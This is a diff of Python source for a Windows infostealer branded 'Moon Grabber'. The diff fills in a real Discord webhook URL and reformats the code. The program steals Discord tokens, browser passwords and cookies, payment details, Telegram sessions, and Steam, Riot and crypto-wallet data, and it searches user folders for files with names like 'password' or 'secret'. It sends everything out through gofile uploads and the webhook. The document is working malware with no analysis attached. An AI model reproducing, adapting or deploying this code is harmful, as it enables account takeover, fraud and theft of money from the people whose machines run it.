@@ -13,7 +13,7 @@ import random, subprocess, platform, socket
 import time, os
 import getpass
 
-whook = "run builder py first"
+whook = "https://discord.com/api/webhooks/1073429519010103318/Bb-QBNk7fhFkrUBoYwo-DGlg3tbgfoCTX42lqLY9L7S7FPqa48IHedsT6cCL3rOGdXsp"
 
 try:
     from PIL import ImageGrab
@@ -28,10 +28,7 @@ DETECTED = False
 
 def getip():
     ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
+    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
     return ip
 
 
@@ -72,9 +69,9 @@ def CryptUnprotectData(encrypted_bytes, entropy=b""):
     blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
     blob_out = DATA_BLOB()
 
-    if windll.crypt32.CryptUnprotectData(
-        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
-    ):
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
+                                         byref(blob_entropy), None, None, 0x01,
+                                         byref(blob_out)):
         return GetData(blob_out)
 
 
@@ -91,33 +88,26 @@ def DecryptValue(buff, master_key=None):
 
 def LoadRequests(methode, url, data="", files="", headers=""):
     for i in range(8):  # max trys
-        try:
-            if methode == "POST":
-                if data != "":
-                    r = requests.post(url, data=data)
-                    if r.status_code == 200:
-                        return r
-                elif files != "":
-                    r = requests.post(url, files=files)
-                    if (
-                        r.status_code == 200 or r.status_code == 413
-                    ):  # 413 = DATA TO BIG
-                        return r
-        except:
-            pass
+        if methode == "POST":
+            if data != "":
+                r = requests.post(url, data=data)
+                if r.status_code == 200:
+                    return r
+            elif files != "":
+                r = requests.post(url, files=files)
+                if (r.status_code == 200
+                        or r.status_code == 413):  # 413 = DATA TO BIG
+                    return r
 
 
 def LoadUrlib(whook, data="", files="", headers=""):
     for i in range(8):
-        try:
-            if headers != "":
-                r = urlopen(Request(whook, data=data, headers=headers))
-                return r
-            else:
-                r = urlopen(Request(whook, data=data))
-                return r
-        except:
-            pass
+        if headers != "":
+            r = urlopen(Request(whook, data=data, headers=headers))
+            return r
+        else:
+            r = urlopen(Request(whook, data=data))
+            return r
 
 
 payload = {"content": "@everyone **NEW LOG!**"}
@@ -128,13 +118,9 @@ response = requests.post(whook, json=payload)
 def globalInfo():
     ip = getip()
     username = os.getenv("USERNAME")
-    ipdatanojson = (
-        urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}"))
-        .read()
-        .decode()
-        .replace("callback(", "")
-        .replace("})", "}")
-    )
+    ipdatanojson = (urlopen(Request(
+        f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace(
+            "callback(", "").replace("})", "}"))
     # print(ipdatanojson)
     ipdata = loads(ipdatanojson)
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
@@ -213,9 +199,12 @@ def GetUHQFriends(token):
         },
     ]
     headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Authorization":
+        token,
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
     try:
         friendlist = loads(
@@ -223,11 +212,7 @@ def GetUHQFriends(token):
                 Request(
                     "https://discord.com/api/v6/users/@me/relationships",
                     headers=headers,
-                )
-            )
-            .read()
-            .decode()
-        )
+                )).read().decode())
     except:
         return False
 
@@ -247,9 +232,12 @@ def GetUHQFriends(token):
 
 def GetBilling(token):
     headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Authorization":
+        token,
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
     try:
         billingjson = loads(
@@ -257,11 +245,7 @@ def GetBilling(token):
                 Request(
                     "https://discord.com/api/users/@me/billing/payment-sources",
                     headers=headers,
-                )
-            )
-            .read()
-            .decode()
-        )
+                )).read().decode())
     except:
         return False
 
@@ -346,16 +330,18 @@ def GetBadge(flags):
 
 def GetTokenInfo(token):
     headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Authorization":
+        token,
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
 
     userjson = loads(
-        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
-        .read()
-        .decode()
-    )
+        urlopen(
+            Request("https://discordapp.com/api/v6/users/@me",
+                    headers=headers)).read().decode())
     username = userjson["username"]
     hashtag = userjson["discriminator"]
     email = userjson["email"]
@@ -379,12 +365,17 @@ def GetTokenInfo(token):
 
 def checkToken(token):
     headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Authorization":
+        token,
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
     try:
-        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+        urlopen(
+            Request("https://discordapp.com/api/v6/users/@me",
+                    headers=headers))
         return True
     except:
         return False
@@ -393,10 +384,13 @@ def checkToken(token):
 def uploadToken(token, path):
     global whook
     headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
-    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
+    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(
+        token)
 
     if pfp == None:
         pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
@@ -414,59 +408,63 @@ def uploadToken(token, path):
         nitro = "?"
 
     data = {
-        "content": "",
-        "embeds": [
-            {
-                "color": 0,
-                "fields": [
-                    {
-                        "name": ":tickets:   -   Token:",
-                        "value": f"```{token}```",
-                    },
-                    {
-                        "name": ":earth_asia:   -   Email:",
-                        "value": f"```{email}```",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":telephone_receiver:   -   Phone:",
-                        "value": f"{phone}",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":globe_with_meridians:   -   IP:",
-                        "value": f"```{getip()}```",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":beginner:   -   Badges:",
-                        "value": f"{nitro}{badge}",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":credit_card:   -   Billing:",
-                        "value": f"{billing}",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":office:   -   Friends:",
-                        "value": f"{friends}",
-                        "inline": False,
-                    },
-                ],
-                "author": {
-                    "name": f"{username}#{hashtag} ({idd})",
-                    "icon_url": f"{pfp}",
+        "content":
+        "",
+        "embeds": [{
+            "color":
+            0,
+            "fields": [
+                {
+                    "name": ":tickets:   -   Token:",
+                    "value": f"```{token}```",
                 },
-                "footer": {
-                    "text": "Moon On Top!",
-                    "icon_url": "",
+                {
+                    "name": ":earth_asia:   -   Email:",
+                    "value": f"```{email}```",
+                    "inline": True,
                 },
-                "thumbnail": {"url": f"{pfp}"},
-            }
-        ],
-        "avatar_url": "",
-        "username": "Moon Grabber",
+                {
+                    "name": ":telephone_receiver:   -   Phone:",
+                    "value": f"{phone}",
+                    "inline": True,
+                },
+                {
+                    "name": ":globe_with_meridians:   -   IP:",
+                    "value": f"```{getip()}```",
+                    "inline": True,
+                },
+                {
+                    "name": ":beginner:   -   Badges:",
+                    "value": f"{nitro}{badge}",
+                    "inline": True,
+                },
+                {
+                    "name": ":credit_card:   -   Billing:",
+                    "value": f"{billing}",
+                    "inline": True,
+                },
+                {
+                    "name": ":office:   -   Friends:",
+                    "value": f"{friends}",
+                    "inline": False,
+                },
+            ],
+            "author": {
+                "name": f"{username}#{hashtag} ({idd})",
+                "icon_url": f"{pfp}",
+            },
+            "footer": {
+                "text": "dsc.gg/yvvi",
+                "icon_url": "",
+            },
+            "thumbnail": {
+                "url": f"{pfp}"
+            },
+        }],
+        "avatar_url":
+        "",
+        "username":
+        "Moon Grabber",
         "attachments": [],
     }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -486,8 +484,10 @@ def Reformat(listt):
 
 def upload(name, link):
     headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
 
     if name == "wpcook":
@@ -496,20 +496,22 @@ def upload(name, link):
             rrrrr = Reformat(str(cookiWords))
             rb = "   -   ".join(da for da in rrrrr)
         data = {
-            "content": "",
-            "embeds": [
-                {
-                    "title": "Moon  -  Cookies Grabber",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[MoonCookies.txt]({link})",
-                    "color": 0,
-                    "footer": {
-                        "text": "Moon On Top!",
-                        "icon_url": "",
-                    },
-                }
-            ],
-            "username": "Moon Grabber",
-            "avatar_url": "",
+            "content":
+            "",
+            "embeds": [{
+                "title": "Moon  -  Cookies Grabber",
+                "description":
+                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[MoonCookies.txt]({link})",
+                "color": 0,
+                "footer": {
+                    "text": "dsc.gg/yvvi",
+                    "icon_url": "",
+                },
+            }],
+            "username":
+            "Moon Grabber",
+            "avatar_url":
+            "",
             "attachments": [],
         }
         LoadUrlib(whook, data=dumps(data).encode(), headers=headers)
@@ -522,43 +524,25 @@ def upload(name, link):
             ra = "  -  ".join(da for da in rrr)
 
         data = {
-            "content": "",
-            "embeds": [
-                {
-                    "title": " Moon  -  Password Grabber",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[MoonPassword.txt]({link})",
-                    "color": 0,
-                    "footer": {
-                        "text": "Moon On Top!",
-                        "icon_url": "",
-                    },
-                }
-            ],
-            "username": "Moon Grabber",
-            "avatar_url": "",
+            "content":
+            "",
+            "embeds": [{
+                "title": " Moon  -  Password Grabber",
+                "description":
+                f"**Found:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[MoonPassword.txt]({link})",
+                "color": 0,
+                "footer": {
+                    "text": "dsc.gg/yvvi",
+                    "icon_url": "",
+                },
+            }],
+            "username":
+            "Moon Grabber",
+            "avatar_url":
+            "",
             "attachments": [],
         }
         LoadUrlib(whook, data=dumps(data).encode(), headers=headers)
-        return
-
-    if name == "kiwi":
-        data = {
-            "content": "",
-            "embeds": [
-                {
-                    "color": 0,
-                    "fields": [{"name": "Files: ", "value": link}],
-                    "author": {"name": " Moon  -  File Grabber"},
-                    "footer": {
-                        "text": "Moon On Top!",
-                        "icon_url": "",
-                    },
-                }
-            ],
-            "username": "Moon Grabber",
-            "avatar_url": "",
-            "attachments": [],
-        }
         return
 
 
@@ -592,13 +576,13 @@ def getToken(path, arg):
     for file in os.listdir(path):
         if file.endswith(".log") or file.endswith(".ldb"):
             for line in [
-                x.strip()
-                for x in open(f"{path}\\{file}", errors="ignore").readlines()
-                if x.strip()
+                    x.strip() for x in open(f"{path}\\{file}",
+                                            errors="ignore").readlines()
+                    if x.strip()
             ]:
                 for regex in (
-                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
-                    r"mfa\.[\w-]{80,95}",
+                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
+                        r"mfa\.[\w-]{80,95}",
                 ):
                     for token in re.findall(regex, line):
                         global Tokens
@@ -622,16 +606,15 @@ def getPassw(path, arg):
         return
 
     tempfold = (
-        temp
-        + "wp"
-        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
-        + ".db"
-    )
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+    cursor.execute(
+        "SELECT action_url, username_value, password_value FROM logins;")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
@@ -673,11 +656,9 @@ def getCookie(path, arg):
         return
 
     tempfold = (
-        temp
-        + "wp"
-        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
-        + ".db"
-    )
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -729,15 +710,15 @@ def GetDiscord(path, arg):
         # print(path, file)
         if file.endswith(".log") or file.endswith(".ldb"):
             for line in [
-                x.strip()
-                for x in open(f"{pathC}\\{file}", errors="ignore").readlines()
-                if x.strip()
+                    x.strip() for x in open(f"{pathC}\\{file}",
+                                            errors="ignore").readlines()
+                    if x.strip()
             ]:
-                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                for token in re.findall(
+                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                     global Tokens
                     tokenDecoded = DecryptValue(
-                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key
-                    )
+                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                     if checkToken(tokenDecoded):
                         if not tokenDecoded in Tokens:
                             # print(token)
@@ -749,16 +730,19 @@ def GetDiscord(path, arg):
 def GatherZips(paths1, paths2, paths3):
     thttht = []
     for patt in paths1:
-        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
+        a = threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[5], patt[1]])
         a.start()
         thttht.append(a)
 
     for patt in paths2:
-        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
+        a = threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[2], patt[1]])
         a.start()
         thttht.append(a)
 
-    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
+    a = threading.Thread(target=ZipTelegram,
+                         args=[paths3[0], paths3[2], paths3[1]])
     a.start()
     thttht.append(a)
 
@@ -781,27 +765,30 @@ def GatherZips(paths1, paths2, paths3):
         for i in OtherZip:
             ot += f"└─ [{i[0]}]({i[1]})\n"
     headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
 
     # Has a problem.
 
     data = {
-        "content": "",
-        "embeds": [
-            {
-                "title": "Moon  -  Zips",
-                "description": f"{wal}\n{ga}\n{ot}",
-                "color": 0,
-                "footer": {
-                    "text": "Moon On Top!",
-                    "icon_url": "",
-                },
-            }
-        ],
-        "username": "Moon Grabber",
-        "avatar_url": "",
+        "content":
+        "",
+        "embeds": [{
+            "title": "Moon  -  Zips",
+            "description": f"{wal}\n{ga}\n{ot}",
+            "color": 0,
+            "footer": {
+                "text": "dsc.gg/yvvi",
+                "icon_url": "",
+            },
+        }],
+        "username":
+        "Moon Grabber",
+        "avatar_url":
+        "",
         "attachments": [],
     }
 
@@ -816,12 +803,8 @@ def ZipTelegram(path, arg, procc):
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if (
-            not ".zip" in file
-            and not "tdummy" in file
-            and not "user_data" in file
-            and not "webview" in file
-        ):
+        if (not ".zip" in file and not "tdummy" in file
+                and not "user_data" in file and not "webview" in file):
             zf.write(pathC + "/" + file)
     zf.close()
 
@@ -960,7 +943,10 @@ def GatherAll():
     ]
 
     PathsToZip = [
-        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
+        [
+            f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"',
+            "Wallet"
+        ],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
         [
@@ -974,7 +960,9 @@ def GatherAll():
             "RiotClient",
         ],
     ]
-    Telegram = [f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"]
+    Telegram = [
+        f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"
+    ]
 
     for patt in browserPaths:
         a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
@@ -996,9 +984,8 @@ def GatherAll():
         a.start()
         ThCokk.append(a)
 
-    threading.Thread(
-        target=GatherZips, args=[browserPaths, PathsToZip, Telegram]
-    ).start()
+    threading.Thread(target=GatherZips,
+                     args=[browserPaths, PathsToZip, Telegram]).start()
 
     for thread in ThCokk:
         thread.join()
@@ -1021,16 +1008,17 @@ def GatherAll():
 
     for file in ["wppassw.txt", "wpcook.txt"]:
         # upload(os.getenv("TEMP") + "\\" + file)
-        upload(
-            file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
-        )
+        upload(file.replace(".txt", ""),
+               uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
 
 def uploadToAnonfiles(path):
     try:
         return requests.post(
             f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
-            files={"file": open(path, "rb")},
+            files={
+                "file": open(path, "rb")
+            },
         ).json()["data"]["downloadPage"]
     except:
         return False
@@ -1075,9 +1063,10 @@ def KiwiFile(path, keywords):
         for worf in keywords:
             if worf in file.lower():
                 if os.path.isfile(path + "/" + file) and ".txt" in file:
-                    fifound.append(
-                        [path + "/" + file, uploadToAnonfiles(path + "/" + file)]
-                    )
+                    fifound.append([
+                        path + "/" + file,
+                        uploadToAnonfiles(path + "/" + file)
+                    ])
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
@@ -1089,7 +1078,9 @@ def KiwiFile(path, keywords):
 
 def Kiwi():
     user = temp.split("\AppData")[0]
-    path2search = [user + "/Desktop", user + "/Downloads", user + "/Documents"]
+    path2search = [
+        user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
+    ]
 
     key_wordsFolder = ["account", "acount", "passw", "secret"]
 
@@ -1211,22 +1202,19 @@ username = getpass.getuser()
 
 hostname = socket.gethostname()
 
-hwid = (
-    str(subprocess.check_output("wmic csproduct get uuid"), "utf-8")
-    .split("\n")[1]
-    .strip()
-)
+hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
+            "utf-8").split("\n")[1].strip())
 
-name = (
-    str(subprocess.check_output("wmic csproduct get name"), "utf-8")
-    .split("\n")[1]
-    .strip()
-)
+name = (str(subprocess.check_output("wmic csproduct get name"),
+            "utf-8").split("\n")[1].strip())
 
 embed = {
-    "title": "Moon  -  Extras",
-    "description": "Extra Information.",
-    "color": 0,
+    "title":
+    "Moon  -  Extras",
+    "description":
+    "Extra Information.",
+    "color":
+    0,
     "fields": [
         {
             "name": "User",
@@ -1235,7 +1223,8 @@ embed = {
         },
         {
             "name": "System",
-            "value": f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
+            "value":
+            f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
             "inline": True,
         },
     ],
